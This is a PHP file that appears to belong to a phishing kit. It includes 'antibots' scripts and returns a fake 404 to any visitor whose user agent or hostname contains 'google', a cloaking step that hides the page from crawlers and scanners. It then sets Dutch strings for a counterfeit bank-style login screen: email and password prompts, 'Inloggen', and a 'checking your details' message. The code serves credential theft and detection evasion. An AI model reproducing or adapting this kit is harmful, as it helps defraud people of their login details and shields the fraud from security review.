<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="Enkele gegevens zijn niet correct. Probeer het opnieuw.";
$Email= "E-mailadres";
$Password = "Wachtwoord";
$dok = "Inloggen";
$req1 = 'E-mailadres is vereist.';
$req2 = 'Wachtwoord is vereist';
$forgot ="Heeft u problemen met inloggen?";
$sign = "Rekening openen";
$checking = "Uw gegevens worden gecontroleerd...";
$priva = "Privacy";
$ri8 = "Alle rechten voorbehouden";
$legal = "";
// fin connexioon
?>